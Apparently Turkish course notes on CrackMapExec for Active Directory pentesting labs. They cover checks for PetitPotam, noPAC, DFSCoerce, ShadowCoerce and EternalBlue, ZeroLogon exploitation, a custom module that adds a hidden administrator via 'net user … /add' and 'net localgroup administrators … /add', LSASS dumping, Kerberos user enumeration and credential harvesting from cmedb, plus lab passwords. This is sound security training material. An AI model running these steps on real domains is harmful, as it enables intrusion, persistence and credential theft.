+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
